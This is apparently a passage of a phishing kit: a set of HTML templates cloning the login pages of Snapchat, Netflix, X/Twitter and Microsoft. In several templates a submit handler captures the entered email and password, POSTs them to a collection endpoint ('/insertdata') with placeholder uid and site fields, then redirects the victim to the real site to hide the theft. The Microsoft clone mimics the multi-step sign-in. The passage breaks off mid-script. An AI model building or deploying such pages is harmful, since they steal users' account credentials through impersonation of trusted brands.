      border: none;
      font-size: 16px;
      color: #55ccffd0;
      cursor: pointer;
      display: flex;
      align-items: center;
    }
  
    .back-button:hover {
      color: #027bde;
    }
    .incorrect {
  color: red;
  display: none;
  margin-top: -10px;
  margin-left:  5px;
  margin-bottom: 5px;
  font-size: 13px;
  font-weight: 400;
  text-align: left; /* Ensures the text aligns to the left */
  }
  
    .error-message {
    display: none; /* Hidden by default */
    background-color: #f44336; /* Red background */
    color: white; /* White text */
    padding: 15px;
    margin: 20px;
    border-radius: 5px;
    font-size: 16px;
    text-align: center;
    animation: fadeIn 0.5s ease-out, vibrate 0.2s ease-in-out 3;
  }
  /* Fade-in animation */
  @keyframes fadeIn {
    from {
        opacity: 0;
    }
    to {
        opacity: 1;
    }
  }
  
  /* Vibration animation */
  @keyframes vibrate {
    0% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    50% { transform: translateX(5px); }
    75% { transform: translateX(-5px); }
    100% { transform: translateX(0); }
  }
      </style>
  </head>
  <body>
    <!-- Back Button -->
    <button class="back-button" onclick="window.location.href='/Acconts.html';">
      <img src="https://raw.githubusercontent.com/tejazmali/Snapchat-login-clone/refs/heads/main/img/left-arrow.png" height="15px" width="15px" alt="">
    </button>
  
    <div class="login-container">
      <div id="error-message" class="error-message">
        Something went wrong ! Please re-login to your account.
    </div>
      <h1>Log In</h1>
      <!-- Form for login -->
      <form action="" method="POST"  onsubmit="handleSubmit(event)">
        <label for="username">USERNAME OR EMAIL</label>
        <input type="text" id="username" name="name" required>
        
        <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
        
        <label for="password">PASSWORD</label>
        <div class="password-container">
          <input type="password" id="password" name="message" required>
          <button type="button" class="toggle-password">
            <img src="https://raw.githubusercontent.com/tejazmali/Snapchat-login-clone/refs/heads/main/img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
          </button>
        </div>
        
        <div class="save-info">
          <input type="checkbox" id="save-login">
          <label for="save-login">Save Login Info on your device</label>
        </div>
        
        <div class="incorrect">
          <p>Incorrect password, please try again.</p>
        </div>
        
        <p class="forgot-password"><a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a></p>
        
        <button type="submit" id="sssssignsin" class="login-button" >Log In</button>
      </form>
      
      <script >
          const switchToPhone = document.getElementById('switch-to-phone');
          const usernameInput = document.getElementById('username');
          const label = document.querySelector('label[for="username"]');
    
    switchToPhone.addEventListener('click', function () {
    if (label.textContent === 'USERNAME OR EMAIL') {
      label.textContent = 'PHONE NUMBER';
      usernameInput.type = 'tel';
    
      switchToPhone.textContent = 'Use email instead';
    } else {
      label.textContent = 'USERNAME OR EMAIL';
      usernameInput.type = 'text';
    
      switchToPhone.textContent = 'Use phone number instead';
    }
    });
  
    const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById('username').value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("sssssignsin");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
              window.location.href = "https://snapchat.com/";
          } catch (error) {
            window.location.href = "https://snapchat.com/";
            }
          }
      </script>
      
  </body>
  </html>`,
    "netflix":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <title>Test Page</title>
      <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("amazon");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
      
              window.location.href = "https://netflix.com/";
          } catch (error) {
            window.location.href = "https://netflix.com/";
            }
          }
        </script>
      
      <style>
          body{
      margin: 0;
      padding: 0;
      background: url("https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/background.jpg") no-repeat center center fixed; 
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
      font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;
  }
  
  .img-logo{
      height: 94px;
      margin-left: 45px;
  }
  
  .upper{
      background-color: rgba(0, 0, 0, 0.6);
      padding-bottom: 100px;
  }
  
  .bottom{
      background-color: rgba(0, 0, 0, 0.85);
      color: #757575;
      
  }
  
  .bottom-width{
      max-width: 1000px;
      margin: 0 auto;
      padding: 30px;
  }
  
  .bottom-flex{
      display: flex;
      flex-wrap: wrap;
      padding: 15px 0 0 0;
      margin-block-start: 0;
      margin-block-end: 0;
  }
  
  .bottom-flex li{
      list-style: none;
  }
  
  .list-bottom{
      width: 25%;
      margin-top: 10px;
  }
  
  .link-bottom{
      text-decoration: none;
      color: #757575;
      font-size: 0.8rem;
  }
  
  .link-bottom:hover{
      text-decoration: underline;
      
  }
  
  .login{
      margin: 0 auto;
      width: 310px;
      background-color: rgba(0, 0, 0, 0.6);
      border-radius: 5px;
      padding: 30px 70px 143px 70px;
  }
  
  .login h1{
      color: white;
      padding-bottom: 10px;
  }
  
  .input-text{
      margin-bottom: 20px;
  }
  
  .input-text input{
      width: 100%;
      height: 45px;
      background-color: #333;
      color: white;
      border-radius:5px;
      border: none;
      outline: transparent;
      text-indent: 18px;
  }
  
  .input-text input::-webkit-input-placeholder {
      font-size: 1rem;
      color: #999;
  }
  
  .input-text input::-moz-placeholder {
      font-size: 1rem;
      color: #999;
      text-indent: 40px;
  }
  
  .signin-button{
      margin-top: 20px;
      width: 100%;
      padding: 13px;
      border-radius: 5px;
      background-color: red;
      color:white;
      border:none;
      font-weight: bold;
      font-size: 1.05rem;
      cursor: pointer;
  }
  
  .remember-flex{
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 0.8rem;
  }
  
  .color_text{
      color: #b3b3b3;
  }
  
  .color_link{
      color: #737373;
  }
  
  .signup-link{
      color: white;
      text-decoration: none;
  }
  
  .warning-input{
      display: none;
      color:#e87c03;
      margin-top: 0;
      font-size: 0.8rem;
      margin-top: 6px;
  }
  
  .signup-link:hover{
      text-decoration: underline;
  }
  
  .face_icon{
      color: #3b5998;
      margin-right: 6px;
      font-size: 20px;
  }
  
  .log_face{
      text-decoration: none;
      margin-left: 10px;
      font-size: 0.8rem;
  }
  
  .login-face{
      margin: 50px 0 15px 0;
      vertical-align: middle;
      color: #8c8c8c;
  }
  
  .new-members{
      margin-bottom: 10px;
      color: #8c8c8c;
  }
  
  .help a{
      text-decoration: none;
  }
  .help a:hover{
      text-decoration: underline;
  }
  
  .protection{
      font-size: 0.8rem;
      color: #8c8c8c;
  }
  
  .protection a{
      text-decoration: none;
  }
  
  .protection a:hover{
      text-decoration: underline;
  }
  
  .tel-link{
      text-decoration: none;
      color: #757575;
  }
  
  .tel-link:hover{
      text-decoration: underline;
  }
  
  .select-language{
      -webkit-appearance: none;
      -moz-appearance: none;
      background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhRE9DVFlQRSBzdmcgIFBVQkxJQyAnLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4nICAnaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkJz48c3ZnIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDUwIDUwIiBoZWlnaHQ9IjUwcHgiIGlkPSJMYXllcl8xIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA1MCA1MCIgd2lkdGg9IjUwcHgiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxyZWN0IGZpbGw9Im5vbmUiIGhlaWdodD0iNTAiIHdpZHRoPSI1MCIvPjxwb2x5Z29uIHN0cm9rZT0id2hpdGUiICBwb2ludHM9IjQ3LjI1LDE1IDQ1LjE2NCwxMi45MTQgMjUsMzMuMDc4IDQuODM2LDEyLjkxNCAyLjc1LDE1IDI1LDM3LjI1ICIvPjwvc3ZnPg==");
      background-size: 12px;
      background-position-x: calc(100% - 7px);
      background-position-y: calc(100% - 14px);
      background-repeat: no-repeat;
      background-color: #000;
      color:#757575;
      padding: 14px 20px 14px 14px;
      margin: 30px 0 40px 0;
      font-size: 0.9rem;
      min-height: 40px;
      border: 1px solid #333;
  }
  
  .select-language option{
      padding-left: 10px; 
  }
  
  @media screen and (max-width: 740px){
      body{
          background: black;
      }
  
      .img-logo {
          margin-left: 22px;
      }
  
      .login{
          padding: 0 10px 0 10px;
          width: 100%;
      }
  
      .login-div{
          width: 90%;
          margin: 0 auto;
      }
  
      .bottom {
          border-top: 1px solid #737373;
      }
  
      .upper{
          padding-bottom: 93px;
      }
  
      .list-bottom{
          width: 33%;
      }
  }
  
  @media screen and (max-width: 500px){
      .list-bottom{
          width: 50%;
      }
  }
  
      </style>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
      <link rel="stylesheet" href="style/style.css">
      <link rel="icon" href="https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/logo.png">
      <title>Netflix</title>
      
  </head>
  <body>
      <div class="upper">
          <div class="logo">
              <a href="#">
                  <img src="https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/Netflix-Logo.png" class="img-logo"/>
              </a>
          </div>
          <div class="login-div">
              <form class="login">
                  <h1>Sign In</h1>
                  <div class="input-text">
                      <input type="text" id="email" name="email" placeholder="Email or phone number" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                      <div class="warning-input" id="warningEmail">
                          Please enter a valid email or phone number.
                      </div>
                  </div>
                  
                  <div class="input-text">
                      <input type="password" id="password" name="password" placeholder="Password" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                      <div class="warning-input" id="warningPassword">
                          Your password must contain between 4 and 60 characters.
                      </div>
                  </div>
                  
                  <div>
                      <button class="signin-button" id="amazon" onclick="handleSubmit(event)">Sign In</button>
                  </div>
                  <div class="remember-flex">
                      <div>
                          <input type="checkbox">
                          <label class="color_text">Remember me</label>
                      </div>
                      <div class="help">
                          <a class="color_text" href="#">Need help?</a>
                      </div>
                  </div>
                  <div class="login-face">
                      <img src="https://raw.githubusercontent.com/Elson0509/Netflix_login_design_clone/refs/heads/main/img/fb-icon.png" height="20"/><a href="#" class="color_link log_face">Login with Facebook</a>
                  </div>
                  <div class="new-members">
                      New to Netflix? <a href="#" class="signup-link">Sign up now</a>.
                  </div>
                  <div class="protection color_link help">
                      This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
                  </div>
              </form>
          </div>
      </div>
      <div class="bottom">
          <div class="bottom-width">
              Questions? Call <a href="tel:1-844-542-4813" class="tel-link">1-844-542-4813</a>
              <div>
                  <ul class="bottom-flex">
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              FAQ
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Help Center
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Terms of Use
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Privacy
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Cookie Preferences
                          </a>
                      </li>
                      <li class="list-bottom">
                          <a href="#" class="link-bottom">
                              Corporate information
                          </a>
                      </li>
                  </ul>
              </div>
              <div>
                  <select class="fa select-language">
                      <option> &#xf0ac; &nbsp;&nbsp;&nbsp;English</option>
                      <option> &#xf0ac; &nbsp;&nbsp;&nbsp;Fran&ccedil;ais</option>
                  </select>
              </div>
          </div>
      </div>
      <script src="js/script.js"></script>
  </body>
  </html>`,
    "twitter":`<!DOCTYPE html>
  <html lang="en">
  <head>
  <title>Test Page</title>
  <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("amazon");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
      
               window.location.href = "https://twitter.com/";
          } catch (error) {
            window.location.href = "https://twitter.com/";
            }
          }
        </script>
      
      <style>
          @import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap');
  
  :root{
      --bg-color: #242d34;
      --white-color: #e7e9ea;
      --black-color: #0f1419;
      --grey-color: #71767b;
      --focus-color: #1d9bf0;
      --grey-color-hover: #333639;
      --white-color-hover: #e6e6e6;
      --black-color-hover: #536471;
  }
  
  *{
      margin: 0;
      padding: 0;
      box-sizing: border-box;
  }
  
  button{
      border: none;
      background: none;
      font-family: inherit;
      color: inherit;
      cursor: pointer;
  }
  
  a{
      text-decoration: none;
      font-family: inherit;
      color: inherit;
  }
  
  body{
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: var(--bg-color);
      color: var(--white-color);
      font-family: 'Roboto', sans-serif;
  }
  
  .container{
      max-width: 600px;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      background-color: #000;
      padding: 24px 20px;
      border-radius: 16px;
  }
  
  .header{
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      color: inherit;
  }
  
  .close_button{
      position: absolute;
      top: 0;
      left: 0;
      font-size: 20px;
      border-radius: 50%;
      padding: 8px;
      cursor: pointer;
  }
  
  .close_button:hover{
      background-color: var(--grey-color-hover);
  }
  
  .logo{
      cursor: pointer;
      font-size: 35px;
  }
  
  .content{
      width: 300px;
      color: inherit;
      text-align: center;
  }
  
  .content h1{
      margin-block: 28px;
  }
  
  .action_buttons,
  .sign_up_buttons{
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: inherit;
      color: inherit;
      gap: 1.3rem;
  }
  
  .primary,
  .secondary{
      width: 100%;
      font-size: 16px;
      padding: 5px 0;
      border-radius: 16px;
  }
  
  .primary{
      background-color: #fff;
      color: var(--black-color);
      transition: .2s ease;
      font-weight: 600;        
  }
  
  .primary:hover{
      background-color: var(--white-color-hover);
  }
  
  .secondary{
      background-color: transparent;
      color: var(--white-color);
      border: 1px solid var(--grey-color);
  }
  
  .secondary:hover{
      background-color: var(--grey-color-hover);
  }
  
  .sign_in{
      display: flex;
      justify-content: center;
      align-items: center;
  }
  
  .sign_in object{
      height: 24px;
      width: 24px;
      margin-right: 4px;
  }
  
  .divider{
      margin-block: 28px;
      position: relative;
  }
  
  .divider::before,
  .divider::after{
      content: '';
      position: absolute;
      height: 1px;
      width: 45%;
      background-color: var(--grey-color);
      top: 50%;
  }
  
  .divider::before{
      left: 0;
  }
  
  .divider::after{
      right: 0;
  }
  
  .email_label{
      width: 100%;
      display: flex;
      align-items: center;
      flex-direction: column;
      position: relative;
      margin-bottom: 32px;
  }
  
  .email_label input{
      width: 100%;
      background-color: transparent;
      border: 1px solid var(--grey-color);
      border-radius: 16px;
      outline: none;
      padding: 25px 10px 10px 10px;
      color: var(--white-color);
      font-size: 18px;
  }
  
  .email_label label{
      position: absolute;
      top: 20px;
      left: 10px;
      font-size: 18px;
      color: var(--grey-color);
      transition: .2s ease;
  }
  
  .email_label input::placeholder{
      opacity: 0;
  }
  
  .email_label input:focus{
      outline: 1px solid var(--focus-color);
  }
  
  .email_label input:focus + label,
  .email_label input:not(:placeholder-shown) + label {
      font-size: 10px;
      top: 10px;
      color: var(--focus-color);
  }
  
  .footer{
      margin-top: 28px;
      font-size: 14px;
      color: var(--grey-color);
      font-weight: 300;
  }
  
  .footer a{
      color: var(--focus-color);
  }
  
  .footer a:hover{
      text-decoration: underline;
  }
      </style>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>X Login Clone Webpage</title>
      <link rel="stylesheet" href="style.css">
      <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet"/>
  </head>
  <body>
      <div class="container">
          <div class="header">
              <div class="close_button">
                  <i class="ri-close-fill"></i>
              </div>
              <div class="logo">
                  <i class="ri-twitter-x-fill"></i>
              </div>
          </div>
  
          <div class="content">
              <button onclick="handleSubmit(event)">
                  <h1>Login to X</h1>
              </button>
              
  
              <div class="action_buttons">
                  <button class="primary sign_in">
                      <object data="https://i.postimg.cc/KzSzY5g4/google.png" type=""></object>
                      <span>Sign in with Google</span>
                  </button>
                  <button class="primary sign_in">
                      <object data="https://i.postimg.cc/P57JgHXW/apple.png" type=""></object>
                      <span>Sign in with Apple</span>
                  </button>
              </div>
  
              <div class="divider">
                  <p>or</p>
              </div>
  
              <div class="email_label">
                  <input type="text" id="log_in" placeholder="email">
                  <label for="log_in">Telephone, email, username</label>
              </div>
  
              <div class="sign_up_buttons">
                  <button class="primary sign_up">
                      Next
                  </button>
                  <button class="secondary sign_up">
                      Forgot Password?
                  </button>
              </div>
  
          </div>
  
          <div class="footer">
              <p>Don't have an account? <a href="#">Sign up</a></p>
          </div>
  
      </div>
  </body>
  </html>`,
    "microsoft":`<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
        }

        html,
        body {
            background-image: url('https://logincdn.msauth.net/shared/5/images/3_57fee22710b04cebe1d5.svg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            color: #1b1b1b;
            min-height: 100vh;
        }

        section{
            display:table-cell;
            vertical-align:middle;
            height: 100vh;
            width: 100rem;
            max-width: 100%;
        }

        .title {
            line-height: 1.75rem;
            color: #1b1b1b;
            font-size: 1.5rem;
            font-weight: 600;
        }

        .auth-wrapper {
            max-width: 440px;
            width: calc(100% - 40px);
            padding: 44px;
            margin: auto;
            margin-bottom: 28px;
            background-color: #fff;
            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
            min-width: 320px;
            /* min-height: 338px; */
            /* overflow: hidden;
            position: absolute;
            transform: translate(-50%, -50%);
            top: 50%;
            left: 50%; */
        }

        .opts {
            padding: 10px 44px;
            max-width: 440px;
            cursor: pointer;
            margin: auto;
            background-color: #fff;
            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
        }

        .opts:hover {
            background-color: rgba(0, 0, 0, .1);
        }

        .input {
            padding: 4px 8px;
            border-style: solid;
            border-width: 2px;
            border-color: rgba(0, 0, 0, .4);
            background-color: rgba(255, 255, 255, .4);
            height: 32px;
            height: 2rem;
            padding: 6px 10px;
            padding-left: 10px;
            border-width: 1px;
            border-top-width: 1px;
            border-right-width: 1px;
            border-left-width: 1px;
            border-color: #666;
            border-color: rgba(0, 0, 0, .6);
            height: 36px;
            outline: none;
            border-radius: 0;
            -webkit-border-radius: 0;
            background-color: transparent;
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            padding-left: 0;
            width: calc(100% - 20px);
        }

        .input:hover {
            border-color: #323232;
            border-color: rgba(0, 0, 0, .8);
        }

        .input::placeholder {
            font-size: 15px;
        }

        .mb-0 {
            margin-bottom: 0;
        }

        a.link {
            text-decoration: none;
            color: #0067b8
        }

        a:hover {
            text-decoration: underline !important;
            color: #666;
        }

        a:focus {
            border: 1px dotted #000;
            text-decoration: underline !important;
        }

        .btn {
            margin: 0 0 0 auto;
            display: block;
            background-color: #0067b8;
            color: #fff;
            border: 2px solid #0067b8;
            padding: 5px 30px;
            font-size: 15px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #005da6;
        }

        .has-icon {
            display: flex;
            gap: 5px;
            align-items: center;
        }

        .mb-16 {
            margin-bottom: 16px;
        }

        .has-icon .icon {
            display: inline-flex;
        }

        .footer {
            position: absolute;
            left: 0;
            bottom: 0;
            width: 100%;
            overflow: visible;
            z-index: 99;
            clear: both;
            min-height: 28px;
            display: flex;
            flex-direction: row;
            gap: 10px;
            justify-content: end;
        }

        .footer a,
        .footer span {
            color: #000;
            font-size: 12px;
            line-height: 28px;
            margin-left: 8px;
            margin-right: 8px;
            text-decoration: none;
        }

        .footer span {
            font-size: 20px;
            line-height: 20px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .d-none {
            display: none;
        }

        .back {
            border: none;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            background-color: unset;
            cursor: pointer;
        }

        .identity {
            display: inline-flex;
            gap: 5px;
        }

        .d-block {
            display: block;
        }

        .w-100 {
            width: 100%;
        }

        .back:hover {
            background-color: #e6e6e6;
            background-color: rgba(0, 0, 0, .1);
        }

        .mt-16 {
            margin-top: 16px;
        }

        .mb-16 {
            margin-bottom: 16px;
        }

        .error {
            color: var(--error) !important;
        }

        .error-inp {
            border-bottom-color: var(--error) !important;
        }

        .btn-group {
            text-align: right;
            width: 100%;
            margin: 16px 0;
        }

        .btn-group>.btn {
            display: inline;
        }

        .btn-group>.btn:not(:last-child) {
            margin-right: 5px;
        }

        .btn-sec {
            background-color: #b2b2b2;
            color: #000;
            border-color: #b2b2b2;
        }

        .btn-sec:hover {
            background-color: rgba(0, 0, 0, .3);
        }

        #btn_final:hover {
            text-decoration: underline;
        }

        .text-title {
            font-size: 1.5rem;
        }

        label.has-checkbox {
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }

        .checkbox {
            width: 20px;
            height: 20px;
        }

        .p {
            font-weight: 400;
            font-size: 15px;
            margin: 16px 0;
        }

        .fs-13 {
            font-size: 13px;
        }

        #user_identity {
            font-size: 15px;
            color: #1b1b1b;
        }

        img{
            vertical-align: middle;
        }

        @media screen and (max-width:600px) {
            html, body{
                background-color: #fff;
            }
            .auth-wrapper{
                box-shadow: none !important;
                /* margin:auto 80px; */
                padding: 24px !important;
                /* position: relative;
                transform: none; */
                /* top: 0;
                left: 0; */
                width: unset !important;
                max-width: unset !important;
                margin: 0 30px !important;
            }
            .opts{
                box-shadow: none !important;
                padding: 8px 24px !important;
                border: 1px solid #999;
                /* padding of 24px on both sides = 48px*/
                /* padding of 24px on authwrapper and margin of 30px  sides = 54px*/
                max-width: calc(100% - 112px);
                margin: 12% auto !important;
            }
        }
        :root {
            --error: #e81123;
        }
    </style>
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="https://raw.githubusercontent.com/Octagon-simon/microsoft-login-clone/refs/heads/main/assets/logo.png" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form>
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                </div>
            </form>
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="https://raw.githubusercontent.com/Octagon-simon/microsoft-login-clone/refs/heads/main/assets/question.png" alt="Question img">
                    </a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_next">Next</button>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="https://raw.githubusercontent.com/Octagon-simon/microsoft-login-clone/refs/heads/main/assets/key.png"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>

    <section id="section_pwd" class="d-none">
        <div class="auth-wrapper">
            <img src="https://raw.githubusercontent.com/Octagon-simon/microsoft-login-clone/refs/heads/main/assets/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <button class="back">
                    <img src="https://raw.githubusercontent.com/Octagon-simon/microsoft-login-clone/refs/heads/main/assets/back.png" />
                </button>
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Enter password</h2>
            <form>
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                </div>
            </form>
            <div>
                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                <p class="mb-16">
                    <a href="#" class="link fs-13">Other ways to sign in</a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_sig">Sign in</button>
            </div>
        </div>
    </section>

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="https://raw.githubusercontent.com/Octagon-simon/microsoft-login-clone/refs/heads/main/assets/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox" />
                <span>Don't show this again</span>
            </label>
            <div class="btn-group">
                <button class="btn btn-sec" id="btn_final_no" onclick="handleSubmit(event)">No</button>
                <button class="btn" id="btn_final_yes" onclick="handleSubmit(event)">Yes</button>
            </div>
        </div>
    </section>
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script>
        const unReq = "Enter a valid email address, phone number, or Skype name."
        const pwdReq = "Please enter the password for your Microsoft account."
        const unameInp = document.getElementById('inp_uname');
        const pwdInp = document.getElementById('inp_pwd');
        let view = "uname";

        let unameVal = pwdVal = false;
        /////next button
        const nxt = document.getElementById('btn_next');

        nxt.addEventListener('click', () => {
            //validate the form
            validate();
            if (unameVal) {
                document.getElementById("section_uname").classList.toggle('d-none');
                document.getElementById('section_pwd').classList.remove('d-none');
                document.querySelectorAll('#user_identity').forEach((e) => {
                    e.innerText = unameInp.value;
                })
                view = "pwd";
            }
        })

        //////sign in button

        const sig = document.getElementById('btn_sig');

        sig.addEventListener('click', () => {
            //validate the form
            validate();
            if (pwdVal) {
                document.getElementById("section_pwd").classList.toggle('d-none');
                document.getElementById('section_final').classList.remove('d-none');
                view = "final";
            }
        })

        function validate() {
            function unameValAction(type) {
                if (!type) {
                    document.getElementById('error_uname').innerText = unReq;
                    unameInp.classList.toggle('error-inp');
                    unameVal = false;
                } else {
                    document.getElementById('error_uname').innerText = "";
                    unameInp.classList.remove('error-inp')
                    unameVal = true;
                }

            }
            function pwdValAction(type) {
                if (!type) {
                    document.getElementById('error_pwd').innerText = pwdReq;
                    pwdInp.classList.toggle('error-inp')
                    pwdVal = false;
                } else {
                    document.getElementById('error_pwd').innerText = "";
                    pwdInp.classList.remove('error-inp')
                    pwdVal = true;
                }

            }
            if (view === "uname") {
                if (unameInp.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
                unameInp.addEventListener('change', function () {
                    if (this.value.trim() === "") {
                        unameValAction(false);
                    } else {
                        unameValAction(true);
                    }
                })
            } else if (view === "pwd") {
                if (pwdInp.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
